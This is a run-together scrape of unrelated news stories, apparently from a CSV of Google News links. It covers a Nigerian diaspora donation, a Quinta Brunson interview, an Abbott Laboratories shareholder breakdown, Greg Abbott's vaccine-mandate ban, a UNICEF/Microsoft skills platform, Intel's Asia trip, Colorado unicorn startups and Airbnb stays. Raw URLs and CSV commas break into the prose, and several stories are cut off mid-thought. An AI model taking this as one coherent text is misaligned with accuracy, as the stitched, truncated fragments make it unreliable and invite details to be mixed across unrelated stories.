Mrs. Abike Dabiri-Erewa the Chairman/CEO Nigerians in Diaspora Commission (NiDCOM) has commended David Alaba for donating N13.3 million to curb open defecation in the country.

She gave the appreciation message when officials from Ecobank and the National Coordinator Organised Private Sector Water Sanitation and Hygiene (OPS-WASH) visited her in Abuja to present the symbolic Cheque from the Real Madrid player.

Dabiri-Erewa acknowledged the efforts of Nigerians in Diaspora Europe (NiDOE) and its umbrella group in Austria in facilitating the donation.

In addition she urged other Nigerians in the Diaspora to emulate the laudable initiative of Alaba the Nigerian-born football player of the Real Madrid club.

Receiving the symbolic cheque the NiDCOM Boss said that the gesture by the International Star who was also an OPS-WASH Ambassador is highly commendable.

Furthermore she thanked the vision of the Presidency and the Ministry of Water Resources as well as other stakeholders in pushing for a cleaner and healthier Nigeria.

As a facilitating body and neutral player in the project Dabiri-Erewa stated that the project of building modern toilet facilities aimed at sustainable job creation will begin in Ogun State Alaba’s home state.

Also she urged Project Managers to successfully deliver in record time.

ABC’s new comedy Abbott Elementary manages to ace that test thanks to its creator and star Quinta Brunson. She built the foundation of her comedy career online with her own Instagram series and later working for BuzzFeed eventually landing a role on HBO’s A Black Lady Sketch Show. On Friday’s episode of A Word I spoke with Brunson to discuss the sitcom and her unconventional path to comedy stardom. This conversation has been edited and condensed for clarity.

Jason Johnson: Congrats on Abbott Elementary. As we’ve said you’re not just the star you’re the creator. What was the inspiration behind this project for you?

Quinta Brunson: Well one thing is I’m just a huge fan of workplace comedies. It’s my favorite kind of sitcom. I was obsessed with that dynamic of people coming together who would not maybe talk to each other if it weren’t for this workplace. So that was huge for me. And then mockumentary-style comedies proved to be my favorite in the long run.

When The Office and Parks and Recreation came along I was like well this is extremely my jam. What made those comedies work was having a veil to go behind. And I thought we know teachers. We have this one-dimensional version of them in our heads. But what’s behind that one dimension? I wanted to make it a little bit more on purpose having a documentary crew in a school to show us what goes on behind the lives of these people we all know. One of the cast members on the show says “Well you either are a teacher or you had a teacher.” And I had seen other workplace comedies about teachers and stuff but none that really went behind the veil in that way that I thought could be really cool.

What’s interesting is that none of these workplace comedies have ever had this many Black people before. All we had was Retta on Parks and Recreation.

I know! And here’s the thing Retta and Darryl in The Office… I don’t know something about seeing people like that. Seeing our people in that format I think that Retta and Darryl are two of the best characters of all time in my world. And I think it’s because they got to talk to us via that camera about what their life is at these workplaces. And I think that’s so special for us. We are people existing in a world where we exist as side characters. We’re reduced to our races and not our actual feelings and thoughts so that really drew me to the mockumentary format. It was honestly one of those things where I was like why haven’t we done this yet? There really wasn’t anything out there using this format yet with Black people at the forefront. People of color at the front. And yes we have white characters in our show because that’s just the makeup of a Philadelphia public school but none such stories where Black people were at the forefront.

How did you pull together this cast for Abbott Elementary? You’ve got Tyler James Williams who everybody loves from Everybody Hates Chris. You did a hilarious segment with him when you guys were both on A Black Lady Sketch Show. How did you decide that he was one of the main characters and how did you fill out the rest of the cast?

First of all the role of Gregory I actually kind of wrote for Tyler. When I worked with him on A Black Lady Sketch Show I just really enjoyed working with him so much. I talked to him about this show. He mentioned to me that he would love to get a series just to have some stability. And I was like “Hey I think I might have a role for you. I’m writing it with you in mind and if you want it I’d love for it to be yours.” So fortunately the network in studio were already in love with Tyler so that was easy. Then everybody else had to be casted. I didn’t necessarily have someone in mind and I also thought there was this opportunity for new talent.

I think the other thing that makes sitcoms specifically workplace sitcoms work is new people for audiences to fall all in love with. Janelle James who is kind of a newcomer to TV she’s a standup. She blew me away. Janelle told me that she had gotten the script and she DM me and she was like “I just got your script and it’s funny. And I want to audition.” I knew Janelle as a standup I didn’t even know she acted. I was like “Hell yeah. Please audition. The more the merrier.” And she was it. It was this specific character. She got it. She got all of it. And having her was just like this dream. And the studio and the network saw her and were like ‘Whoa where did she come from?’ And I’m like I don’t know but this is who it has to be. The discussion is over.

Then Sheryl Lee Ralph was our last get. We were so fortunate. She had just come off of a show. We were having trouble casting Barbara’s character because I just needed a certain oomph and Sheryl brought it. I think Sheryl had never been on a show like this before. Sheryl just came off a multicam and Sheryl hadn’t even seen The Office. She had the essence and everything else was an on-the-job learning experience. Like oh okay. I’m on at all times? I’m always in scene because the camera’s catching things at all times? But she mastered it and now has developed what I think is a brand new beautiful character to this format of show.

So that’s how casting went. And then my character Janine was brought about because I originally pitched this show based on Sheryl’s character Barbara. It had no Janine in it. And the studio kind of said you’re crazy if you think we didn’t buy the show because of you. I was like all right. So I developed Janine based off of good friends of mine who are pure optimists who get on my nerves but without them nothing would get done. There in how beautiful the world can be is what motivates us to create a better place. And I think that that was a beautiful character to have in a school like Abbott.

I also grabbed your book She Memes Well: Essays. And so I’ve been reading through the book really really enjoying it. And I want to talk in particular about how it has to do with Abbott Elementary. A lot of people especially in comedy they talk about how they hated high school it was miserable. You were prom queen. I mean you went to Charter High School of Art and Design (CHAD) you went to sort of a tech science architecture school. But how did your experiences in what appears to be a pretty functional good high school experience how does that inform Abbott Elementary? Because most people say that high school was terrible and you’re not that person.

I’m so happy you brought that up. My schooling experiences period I had the most amazing teachers from kindergarten to high school. I had these teachers who cared so deeply. I had a teacher in sixth grade who actually the show was named after Miss Abbott. She came to my house and picked me up because we were doing a pretzel sale and my parents were like “We can’t get her there.” And Miss Abbott was like “Well I’ll come get her. This is important. We’re going to make the dough. I’m teaching a lesson about food and learning and selling.”

Those are the kind of teachers I had in my life from beginning to end. High school teachers that I can’t even go down the list of the way those people just cared about us. And so having a good experience informed what kind of show I would create. A lot of people I think have created school shows with the idea that no one wants to be there…the students the teachers. Not me. People are doing this job or they care that much. They’re being paid pennies. This is just what they do. So I was able to show that.

Institutions often own shares in more established companies while it's not unusual to see insiders own a fair bit of smaller companies. Companies that used to be publicly owned tend to have lower insider ownership.

With a market capitalization of US$238b Abbott Laboratories is rather large. We'd expect to see institutional investors on the register. Companies of this size are usually well known to retail investors too. Taking a look at our data on the ownership groups (below) it seems that institutions own shares in the company. We can zoom in on the different ownership groups to learn more about Abbott Laboratories.

See our latest analysis for Abbott Laboratories

What Does The Institutional Ownership Tell Us About Abbott Laboratories?

Institutional investors commonly compare their own returns to the returns of a commonly followed index. So they generally do consider buying larger companies that are included in the relevant benchmark index.

As you can see institutional investors have a fair amount of stake in Abbott Laboratories. This suggests some credibility amongst professional investors. But we can't rely on that fact alone since institutions make bad investments sometimes just like everyone does. If multiple institutions change their view on a stock at the same time you could see the share price drop fast. It's therefore worth looking at Abbott Laboratories' earnings history below. Of course the future is what really matters.

Investors should note that institutions actually own more than half the company so they can collectively wield significant power. Abbott Laboratories is not owned by hedge funds. Looking at our data we can see that the largest shareholder is The Vanguard Group Inc. with 8.4% of shares outstanding. Capital Research and Management Company is the second largest shareholder owning 8.3% of common stock and BlackRock Inc. holds about 7.6% of the company stock.

A deeper look at our ownership data shows that the top 25 shareholders collectively hold less than half of the register suggesting a large group of small holders where no single shareholder has a majority.

While it makes sense to study institutional ownership data for a company it also makes sense to study analyst sentiments to know which way the wind is blowing. There are a reasonable number of analysts covering the stock so it might be useful to find out their aggregate view on the future.

Insider Ownership Of Abbott Laboratories

While the precise definition of an insider can be subjective almost everyone considers board members to be insiders. Management ultimately answers to the board. However it is not uncommon for managers to be executive board members especially if they are a founder or the CEO.

Story continues

Insider ownership is positive when it signals leadership are thinking like the true owners of the company. However high insider ownership can also give immense power to a small group within the company. This can be negative in some circumstances.

Our data suggests that insiders own under 1% of Abbott Laboratories in their own names. As it is a large company we'd only expect insiders to own a small percentage of it. But it's worth noting that they own US$1.7b worth of shares. It is good to see board members owning shares but it might be worth checking if those insiders have been buying.

General Public Ownership

The general public-- including retail investors -- own 24% stake in the company and hence can't easily be ignored. While this size of ownership may not be enough to sway a policy decision in their favour they can still make a collective impact on company policies.

Next Steps:

It's always worth thinking about the different groups who own shares in a company. But to understand Abbott Laboratories better we need to consider many other factors. Consider for instance the ever-present spectre of investment risk. We've identified 2 warning signs with Abbott Laboratories  and understanding them should be part of your investment process.

Greg Abbott surprised some on his staff when he arrived at his office this fall with plans for a new pandemic decree: a ban on mandated vaccinations by private employers in Texas.

The decision was a stark departure for the two-term governor an intrusion into business decisions of the sort Mr. Abbott had long opposed — and had indeed opposed just two months earlier. “Private businesses don’t need government running their business” a spokeswoman had said then.

His about-face drew criticism from major Texas business groups from corporations like American Airlines and from a powerful player in local Republican politics Texans for Lawsuit Reform. It also prompted frustration among some of the governor’s staff.

Those who have known Mr. Abbott and watched his rise — from lawyer to state court judge to attorney general and ultimately to governor — have been stunned at his sudden alignment with the Republican Party’s most strident activists.",https://news.google.com/articles/CBMiQGh0dHBzOi8vd3d3LnJvcGVyYW5kc29ucy5jb20vb2JpdC9qYWNxdWVsaW4tamFjcXVlLW5pbGVzLWFiYm90dC_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Jacquelin “Jacque” Niles-Abbott,"Jacque spent her early years and mid-teens in Red Cloud NE.

Operating under the Generation Unlimited partnership the Passport to Earning platform aims to address the global education crisis – currently exacerbated by the COVID-19 pandemic – and prepare the next generation for decent work.

The platform will provide young people aged 15-24 across the world with free certified education and skills training—with content spanning across digital foundational role-based and technical skills. Young people using the platform will be able to use the certifications gained to support future employment and entrepreneurship opportunities made available on the platform. The Passport to Earning platform was unveiled today at the RewirEd Summit the largest global education summit of its kind led by Dubai Cares in partnership with Expo 2020 Dubai and in close coordination with the UAE Ministry of Foreign Affairs and International Cooperation (MoFAIC) and delivered in partnership with global stakeholders.

“The youth of today represent the leaders of tomorrow. Preparing and equipping them for the challenges that lie ahead of us is critical to ensuring that our future is in capable hands. Passport to Earning will provide young individuals with an effective tool to strengthen and upscale their skillsets and empower their professional journeys towards greater goals. In addition the RewirEd Summit proved to be a fitting gathering to launch this platform in line with the conversations we hosted around the summit’s first day theme: Youth Skills and the Future of Work” said His Excellency Dr. Tariq Al Gurg Chief Executive Officer and Vice-Chairman of Dubai Cares.

Passport to Earning is built on Microsoft’s Community Training (MCT) platform and will form an extension of UNICEF and Microsoft’s Learning Passport a digital learning platform aimed at school-age children struggling to access mainstream education. Operational in 20 countries the Learning Passport was recently identified by Time Magazine as one of the 100 best inventions of 2021.

“We’ve seen first-hand how technology can be used in transformative ways to reach and connect learners—even in the most challenging scenarios. Passport to Earning is a powerful tool that allows us to reach young people and provide them with digital skilling opportunities at scale. We’re thrilled to work with UNICEF GenU Accenture and Dubai Cares to bring this program to life” said Kate Behncken Vice President and Lead of Microsoft Philanthropies.

The platform will offer online and offline digitalized curricula with supplemental content curated at the national level. It will keep young people learning—both inside and outside of classrooms—with content that is not dependent on a consistent web connection. It will also build government capacity to provide sustainable skilling and employment opportunities in the digital economy.

""Young people across the world are poised to advance their societies and economies. Yet without access to relevant quality education and training opportunities they are unable to truly participate in the 21st century workforce. The Passport to Earning which builds upon proven solutions in delivering education in the most challenging of environments will provide young people with the skills and certification they need to create a better more sustainable world” said Omar Abdi UNICEF Deputy Executive Director.

According to a recent World Bank-UNESCO-UNICEF report the current generation of students risks losing $17 trillion in lifetime earnings—around 14 per cent of today’s global GDP—as a result of COVID-19 pandemic-related school closures. However even before the pandemic young people were not learning the skills necessary for future work. Pre-pandemic data showed that without immediate action by 2030 an estimated 825 million children will not acquire the basic secondary-level skills—such as transferable digital and job-specific skills—needed to support lifelong learning and employment.

“The fourth industrial revolution is bringing with it irreversible changes for the education sector and the labor market—and we must not fail to do our part in enabling young people to prepare for what’s ahead. Passport to Earning exemplifies what partnerships between the public and private sectors the UN and young people can achieve. It’s a new modern and inclusive global skilling solution that will connect millions of underserved youth worldwide with state-of-the-art curriculum certifications and ultimately jobs” said Kevin Frey Chief Executive Officer of GenU.

Rapidly advancing digital solutions have the potential to reach all young people and help them to access world-class learning. Accenture will bring expertise in digital learning and a user-centric design approach to Passport to Earning.

“The need for digital skills has never been greater especially in those regions hardest hit by global inequalities and the impacts of COVID. We are proud to partner with UNICEF Microsoft and Dubai Cares on Passport to Earning to support many thousands of young people get a job or start a business. Working with our global partners Accenture’s Skills to Succeed initiative has equipped over 4.5 million people with the skills to make substantive improvements to their lives” said Jill Huntley Managing Director for Corporate Citizenship at Accenture.

He is the founder and creative director of Serial Cut™ a world-renowned and in-demand design studio which continues to produce some of the most arresting and exciting visuals some 22 years after its inception.

Del Puerto’s work sits at the intersection between art and commerce proving that work made for commercial companies doesn’t have to preclude unfettered creativity. It’s an approach he’s shared as part of the Adobe Creator Collective a group featuring a network of different artists from across Europe. As a unit they offer tips and advice to Adobe users with Adobe providing free assets for up-and-coming creators to get started themselves.

Here Del Puerto shares details of his professional journey lifting the lid on how he’s managed to stay at the top for so long.

When did you first break into the creative industry? Tell us about your journey.

I’d say that 1999 was the year I officially registered “Serial Cut™” as an alias to publish my early freelance designs. I was working in-house for different studios and agencies at the time. I would work the regular day job then come home and use my downtime to build my own brand through freelance assignments and personal projects. It was a frenetic period – I definitely didn’t sleep enough – but I was a workaholic and had the ambition to build up my portfolio to attract more and more clients.

Elaborate on how you and your team approach process?

The journey to create and finalise an image – or motion piece – has so many interesting steps that are the building blocks for what you are seeing conceptually and visually. I couldn’t think of a project that doesn’t have a certain base concept: it doesn’t matter if it’s a big or small client a simple still-life or a big campaign with five key visuals. Process is important as proof of the technique we are using.

What are some of the creative barriers you come across? Do you have any tips for fellow creatives on how to overcome those?

Probably stress fear and self-doubt. From time to time it comes again – with more or less severity depending on the situation – but in my case it was more in the early years. I think everyone in this industry experiences it and learns from it – it makes you grow. Self-confidence is something that will come gradually and you have to get used to it as you grow from your mistakes.

Surrealism plays a large role in your work. Where do you draw this inspiration from? Any favorite artists you’d like to share?

Yes I like surreal visual scenes or concepts – it’s part of my personality. With our imagery we can drive the audience to other worlds or depict impossible objects and scenes with the aim to always elicit a “Wow” from them. Sometimes this can also be ironic and again this is an extension of my personality. I love the work of many artists from different fields such as Serge Lutens Jean Paul Goude Paul Thomas Anderson Michel Gondry Ingmar Bergman Duane Hanson Escher David Lynch Jean-Pierre Jeunet…



How did Covid impact you and your team? How are you overcoming those challenges?

When Covid-19 started in March 2020 it was a shocking moment especially because over the course of a single week we got every one of our projects cancelled. It seemed like the end of the world. Strangely though we were awarded two big projects after those two panic weeks so little by little things became calmer.

Right now we’re still working remotely – I’m the only one who comes to the studio every day to work – and actually we’ve found a nice and effective way to [do it]. Of course the human touch is lost but we speak everyday so in a sense we are more connected than before. It’s hard to see what the future is going to bring us but at least we know we can change internally and adapt and that’s very human.

As a team collaboration is key to success. How do you encourage and manage a collaborative environment?

Absolutely collaboration is the key. As creative director my mission is to envision the final result and what we are going to achieve as a team. I know who can develop certain parts of each project and how to bring together the skills of each artist in-house or freelance.

It’s like a league of superheroes – I know everyone’s capabilities and I just need to join them up to get the result. Here in Serial Cut™ one project passes by different hands to enhance it as much as possible and get that final “Wow” effect. The Adobe Creator Collective project showcases the best new art design and illustration talent weekly connecting artists with the wider Adobe community. Want to be inspired? Visit the website.

This is largely down to Apple's massive gains in GPU performance with the M1 Max delivering rendering power on par with the GeForce RTX 3060.

4 Reviews

CNET recently benchmarked the 2021 Apple MacBook Pro with the M1 Max chip against a 2019 MacBook Pro with a Core i9 in Adobe Lightroom. The results were nothing short of eye-opening with the M1 Max MacBook besting the Core i9 device by up to 5 times. This largely appears to be due to the massive gain in GPU performance. Apple claimed that the M1 Max offered graphics horsepower on par with the GeForce RTX 3080. While gaming benchmarks tell another story - it keeps up with the GeForce RTX 3060 - that's still a massive leg up on the integrated graphics found on the Core i9.

According to the CNET benches the M1 Max MacBook handled a panorama merge of six 30 MP images within just 14 seconds. The same operation took 67 seconds on the Core i9 system a 4.8x increase. Lightroom's Super Resolution a deep learning system that leverages the hardware AI acceleration on the M1 Max chip fared 2.4 better than on the i9 system.

All in all the benchmarks indicate that the M1 Max MacBook is a solid upgrade for users demanding more grunt for video and photo editing. And with GeForce RTX 3060-beating gaming performance it's no slouch in the gaming department either.

FOUNDRY BID: Pat Gelsinger has ruffled feathers with his calls to limit government chip funding to local firms and criticism of the concentration of chip production in Taiwan

Bloomberg





Intel Corp CEO Pat Gelsinger is to visit Taiwan and Malaysia next week for talks that show how manufacturing in Asia is crucial to his efforts to turn around the fortunes of the world’s largest chipmaker by revenue.

Gelsinger’s trip is to include a meeting with leaders of Taiwan Semiconductor Manufacturing Co (TSMC 台積電) people familiar with his plans said.

Intel needs TSMC’s advanced manufacturing services and plans to compete with the Taiwanese company in the foundry business a tricky balancing act for the CEO.

Intel Corp CEO Patrick Gelsinger speaks during an interview at an Economic Club of Washington event in Washington on Thursday. Photo: Bloomberg

This is Gelsinger’s first trip to Asia since taking the top job at Intel earlier this year and comes as he publicly lobbies the US government to allocate money for the country’s chip industry to domestic companies only.

He has said that overseas manufacturers — such as TSMC and Samsung Electronics Co which both have plans to build plants in the US — should not get money through the Chips Act which is going through political approvals in Washington.

As part of those efforts he has said that the concentration of advanced manufacturing in Taiwan is a strategic risk.

TSMC is both a threat to Intel and an interim solution to issues that have seen the US giant lose manufacturing leadership in the chip industry the foundation of its dominance for three decades.

Rivals such as Nvidia Corp and Advanced Micro Devices Inc use TSMC’s production to make chips they say are better than Intel’s offerings. Market share losses and weak earnings from Intel have helped bolster their case.

Part of Gelsinger’s answer to that is a strategy for combining parts of processors made by TSMC with other contributions from his own factories to produce more competitive computer components.

At the same time he is investing heavily to improve his own production to the point where he should no longer need TSMC’s cutting-edge production.

He plans to open factories that would make semiconductors for other companies which is the foundry business model that TSMC pioneered.

While that gives TSMC some leverage it is also left with some tricky decisions. The kind of production that Intel wants and the huge volume of orders it could provide are potentially lucrative for the Taiwanese company. Intel still has about an 80 percent share of the computer processor market.

Gelsinger has said that competition and cooperation between companies is nothing new and technology is full of such arrangements.

Intel has long used TSMC for manufacturing of less-important support chips for computers and other parts of its portfolio.

TSMC’s rapid rise has been built on navigating the complex web of rivalries among its customers of guaranteeing impartiality and of pushing forward production technology quickly. Its customers include Apple Inc Qualcomm Inc Sony Group Corp as well as Nvidia and AMD.

Gelsinger is also to visit Malaysia where COVID-19-related shutdowns of plants have hurt chip supply for many companies.

Intel relies on the Southeast Asian country for some of its chip packaging operations the critical last step in the semiconductor manufacturing process.",https://news.google.com/articles/CBMiTWh0dHBzOi8vZmluYW5jZS55YWhvby5jb20vbmV3cy9mYW11LWF0aGxldGljcy1ob25vcnMtZmFsbC0yMDIxLTE4NTcxNDE4Mi5odG1s0gEA?hl=en-US&gl=US&ceid=US%3Aen,FAMU Athletics honors fall 2021 graduating students for academic sports achievements,"Seventeen Florida A&M student-athletes climbed to the pinnacle of ""The Highest of Seven Hills"" on Friday after walking across the stage during the commencement ceremony.

Recently nearly a half dozen companies in the Boulder Valley have reached that lofty status following in the footsteps of older companies that previously reached that valuation mark after starting here such as Level 3 Inc. StorageTek Inc. and the Zayo Group.

A trio of Louisville-based companies JumpCloud Inc. Sovos Brands Holdings Inc. and Solid Power Inc.; and two based in Boulder SomaLogic Inc. and Uplight Inc. are considered the newest unicorns in the venture-capital world.

The term “unicorn” was coined in 2013 by venture capitalist Aileen Lee founder of Cowboy Ventures a seed-stage venture-capital fund in Palo Alto Calif. According to Investopedia there are only 800 unicorns in the world.

Venture capitalists determine the value of a business by analyzing its management team the composition of its capital structure the prospect of future earnings and the market value of its assets among other metrics.

There are various strategies used to achieve this high valuation: acquiring companies; being acquired or a combination of both; mergers or sheer persistence. But a common thread among the region’s newest unicorns has been their ability to raise venture capital to enable growth.

SomaLogic Inc.

SomaLogic is a protein biomarker discovery and clinical diagnostics company headquartered in Boulder. It took almost two decades of innovative research and investment to reach unicorn status but today SomaLogic operates the SomaScan Platform a new technology that makes protein measurement as straightforward as DNA measurement.

Founded in 2000 by University of Colorado Boulder professor Larry Gold SomaLogic has a valuation north of $2 billion after an initial public offering in September.

Gold recently removed himself from SomaLogic’s board of directors and is heavily involved in the company’s research and development group. SomaLogic has approximately 200 employees worldwide.

The company’s SomaScan Platform can uncover a deeper understanding of the real-time molecular bases of health and disease than is possible through genomic or other protein technologies.

Roy Smythe SomaLogic’s CEO since November 2018 calls SomaLogic “a 21-year-old overnight success story.” Smythe said it took 15 years to develop the SomaScan Platform.

Although the first draft of the human genome was also announced in 2000 SomaLogic embarked on a different path than everyone else focusing instead on the much-harder challenge of measuring changes in the body’s proteins in relation to disease and health. The result of taking that tack is that SomaLogic’s tests provide information that can lead to precise diagnoses by doctors.

SomaLogic began making money when it started selling its life-science tools to contract researchers. When SomaLogic began developing its SomaSignal tests respected investors began taking notice. These diagnostic tests use complex protein measurements and computationally extract precise health information. The company began selling SomaSignal tests to individuals and their health providers a potentially much larger market than just researchers.

The company is demonstrating its diagnostic tests in a few doctors’ offices in Colorado as well as other parts of the country.

Smythe said SomaLogic had a valuation of $350 million in 2020 and went to $1.2 billion after a funding round of $121 million led by New York-based Casdin Capital LLC just prior to SomaLogic’s IPO. SomaLogic began trading on Nasdaq in September after merging with the special-purpose acquisition company CM Life Sciences II Inc. driving its valuation past $2 billion.

Smythe said SomaLogic eventually would have reached the $1 billion valuation milestone with just its foundational tools but the combination of those tools used by researchers and now the promise of the SomaSignal diagnostic tests for health systems accelerated interest among investors that drove up the valuation.

“Who the investors are matters” Smythe said. “Smart money follows smart money. … Investors take note of other investors who did their due diligence and will then follow.”

Joining Casdin Capital in the crossover round were Farallon Capital Management Foresite Capital funds and accounts advised by T. Rowe Price Associates Inc. Blue Water Life Science Advisors Madryn Asset Management Fiscus Ventures and Reimagined Ventures (affiliates of Magnetar Capital) Monashee Investment Management Mossrock Capital Soleus Capital and others.

Smythe said the crossover round (the last one before going public) provides an “uptick in valuation with the money the round provides and a perception bounce based on who invests adding a premium to the valuation. … The IPO then provides an extra kick.”

It’s now a juggernaut protein platform.”

Solid Power Inc.

Solid Power reached the lofty valuation of $1.2 billion and unicorn status when it announced in November that it had agreed to merge with Decarbonization Plus Acquisition Corp. III (Nasdaq: DCRC) for the purpose of going public.

After completing the merger Solid Power officially went public Thursday trading under the ticker symbol SLDP.

The valuation took into account Solid Power’s management team led by co-founder and chief executive Doug Campbell the company’s capital structure plus current sales and projected sales of its solid-state batteries designed for electrical vehicles.

The solid-state batteries are an alternative to lithium-ion batteries used in electric vehicles competing directly with China which controls about 80% of the lithium-ion market.

The company was started as a spin-out business of the University of Colorado Boulder in 2012.

Campbell led the company through its early development and to its current phase of achieving the first step of producing these batteries at its production plant in Louisville.

A second production plant is ramping up in Thornton.

Campbell describes Solid Power’s rise as “dumb luck. … We were in the right place at the right time. The electrification of everything is happening.”

At the outset “We had some compelling science and a concept for a value-added business” Campbell said. “Our trajectory was typical: We needed to move fast raise capital and start producing batteries.”

Since its inception Solid Power has received $250 million in venture capital from approximately 20 investors.

Campbell said one key factor in Solid Power’s growth was when Ford Motor Co. and the BMW Group led a $130 million investment round in May. The two auto companies had previously supported Solid Power but Campbell emphasized that it was a big deal when “BMW and Ford leaned in. That’s when pun intended the rubber hit the road.” The two auto giants also placed executives on Solid Power’s board of directors.

JumpCloud Inc. founded by David Campbell Larry Middle and Rajat Bhargava was recently valued at $2.56 billion following an investment round of $159 million.

The cloud-based directory platform for information technology professionals has raised $350 million since launching in 2012. JumpCloud founded in 2012 was formally launched in 2013 at TechCrunch Disrupt Battlefield as an automated server-management tool. JumpCloud’s cloud-based directory-as-a-service platform is used to manage users’ identity devices and access across things such as VPN Wi-Fi servers and workstations.

It also provides software that allows systems to enforce basic rules on the machines to do basic auditing and to run basic commands remotely.

Sovos Brands Holdings Inc.

Todd Lachman is the founder president and CEO of Sovos Brands Inc. which operates as a food and beverage company.

Lachman and the company’s chairman William Johnson had identified an opportunity within the broader food landscape to acquire and build a portfolio of brands with high-quality products that are in the early stages of growth.

Founded in 2017 the company with investment backing by global private-equity firm Advent International has acquired four early stage companies so far — Rao’s Noosa Birch Benders and Michael Angelo’s. The scaling of these brands has led the company to become the fastest-growing food company of scale in the United States Lachman said.

Management and underwriters of Sovos aimed to sell 23.3 million shares in a preliminary price range between $14 and $16 per share yet lackluster demand made that drop to $12 per share at the time of its initial public offering according to Seeking Alpha.

The company still had outstanding shares after the offering on Sept. 27. At the time of the offering its equity valuation was at $1.17 billion. This excluded a pro forma net debt load of around $535 million and a net debt position just below the half a billion mark. This values the company at around $1.67 billion on an enterprise basis according to Seeking Alpha.

Lachman said the biggest challenge Sovos has faced has been like many of its peers the COVID-19 pandemic and the associated industrywide supply-chain challenges.

“We’ve been able to keep up with the market demand for products in large part due to flexible manufacturing practices and a dedicated focus on our customers and consumers” Lachman said.

Uplight Inc.

Uplight Inc. is an energy-technology firm formed by the merger of Tendril Inc. and Simple Energy Inc.

Although Uplight didn’t reveal the size of the investment it says that the deal values the company at $1.5 billion — putting the company well into unicorn status. Founded in 2019 Uplight was formed when Tendril and Simple Energy merged and then acquired FirstFuel Ecotagious EEme and EnergySavvy.

The latest investment round was co-led by French energy efficiency firm Schneider Electric and power distributor AES Corp. (NYSE: AES). The group of private-equity investors was led by sustainability-focused fund Huck Capital Management LLC.

Uplight’s suite of software gives utilities data about how customers consume energy in their homes and businesses and then it offers ways to reduce their base power demand. It also provides a marketplace for consumers to find rebates and deals on energy-efficient appliances and electric vehicles.

It already counts major energy providers such as Xcel Energy Inc. (Nasdaq: XEL) ConEdison Inc. (NYSE: ED) and Duke Energy Inc. (NYSE: DUK) among its customer base of more than 80 energy providers.

In an earlier interview with BizWest Chief Operating Officer Angela Tucci said the funding will be used to reinforce its core businesses by recruiting more utility customers and attracting more energy-efficient device makers into its consumer products business along with an expansion from residential-focused efficiency services into the commercial-facing market.

“We can diversify from really a centricity in residential to much more in the commercial and industrial space… in ways that we couldn’t without this sort of backing or at least not at this pace” she said.

She also said the investment from Schneider which she estimates has parts in a third of every building on the planet positions the company to expand internationally.

However the company is laying roots in Boulder. It currently employs about 200 people in Colorado with the majority in the city and plans to ramp up hiring.

Boulder-based Rubicon Technology Partners will retain a minority stake in Uplight with the new deal coming into effect. That firm was Uplight’s majority investor and led its creation after the merger of Tendril Networks Inc. and Simple Energy Inc. in 2019 along with several other acquisitions that led to what is now Uplight.",,,,,,,,,,,,

Now it's the McCallisters'.

An overnight stay at Winnketka's ""Home Alone"" house will give up to four guests the chance to relive their favorite scenes from the 1990 holiday classic this month for $25 plus fees and taxes through Airbnb.

The one-night-only stay was available for booking at last week. The home has been designed to look as similar to the movie that made Macaulay Culkin's Kevin McCallister character a household name.

Devin Ratray the actor who played Kevin's older brother Buzz will welcome guests into the McCallister residence via Zoom.

""We may all be older and wiser now but we're never too old for holiday high jinks"" ""Buzz"" said in a statement. ""So this year spend the holidays not-so-home-alone at my parents' house.""

When guests step through the door they'll take in the bold wallpaper red carpet runner and pictures of Buzz on the wall. Bask in the living room's holiday ambiance with a Christmas tree stockings hung over the fireplace -- the whole gambit. Visitors will sleep in Kevin's parents' room -- complete with four-poster bed father's aftershave vintage clock radio and old school big box television. (Should there be children a second guest bedroom is available as well.)

But the experience will mirror the movie in more ways than one. Empty paint cans stand ready for booby-trap setting '90s-era junk food including Chicago's finest pizza and a candlelit dinner of highly nutritious Kraft macaroni and cheese and a meet-and-greet with Buzz's pet tarantula Axl.

Visitors will also get to view ""Home Sweet Home Alone"" wherein Ratray reprises his role and take home a Lego Ideas ""Home Alone"" kit as a memento.

Airbnb reps said they tried to figure out the physics of how the sled scene down the steps would work but opted to have a potential sledding excursion planned instead a safer option. A member of Buzz's ""McCallister Security"" team will arrange meals.

The suburban home remains an attraction to this day. One just has to sit on the Winnetka street for a brief time before people pull out cameras to take pictures of the ""Home Alone"" house making it ideal for a nostalgic holiday stay.

In honor of the first-ever stay at the McCallister home Airbnb will make a one-time donation to Chicago's La Rabida Children's Hospital which is dedicated to maintaining and improving the quality of life for patients with complex conditions disabilities and chronic illness.",https://news.google.com/articles/CBMiWWh0dHBzOi8vcGF0Y2guY29tL2FsYWJhbWEvYWNyb3NzLWFsL2FsYWJhbWFzLWNvb2xlc3QtYWlyYm5iLXNtaXRoLWxha2UtY29uZC1uYXN0LXRyYXZlbGVy0gEA?hl=en-US&gl=US&ceid=US%3Aen,Alabama's Coolest Airbnb Is On Smith Lake: Condé Nast Traveler,"CULLMAN COUNTY AL — A home in Crane Hill Ala. on Smith Lake has been chosen by Condé Nast Traveler as the ""coolest Airbnb in Alabama.""

No matter what you have planned for your upcoming trip you can’t go wrong resting your head in one of the best Airbnb rentals in South Dakota.",https://news.google.com/articles/CBMihAFodHRwczovL3d3dy5sYW5kbG9yZHRvZGF5LmNvLnVrL3RoZS1iaWctaXNzdWVzLzIwMjEvMTIvYWlyYm5iLXYtbG9uZy1sZXRzLXRoZS1iZW5lZml0cy1vZi1ob2xpZGF5LWxldHMtZm9yLWxhbmRsb3Jkcz9zb3VyY2U9dHJlbmRpbmfSAQA?hl=en-US&gl=US&ceid=US%3Aen,Airbnb v Long-Lets: the benefits of holiday-lets for ...,"As of December 2020 over 80 per cent of property owners on Airbnb had signed up for this to help meet a surge in demand from people looking to move for new work placements students needing a place to stay for a term or two or those who simply want a change of scene for a few months following a year of lockdowns.

In April 2020 Airbnb introduced new features making it easier than ever for hosts to accept ‘long term’ bookings at their properties meaning people could book stays of 28 days or more.

Airbnb can make life easier for UK landlords by increasing yields simplifying the rental process and providing peace of mind against damage. While the online booking platform built its reputation on providing short term holiday lets this trend is changing.

For many landlords having a few short-term lets can help enhance a property portfolio and the benefits include dependable income less prohibitive regulation and reduced workload especially when the services of an Airbnb management company are used. There is a wealth of opportunities for landlords.

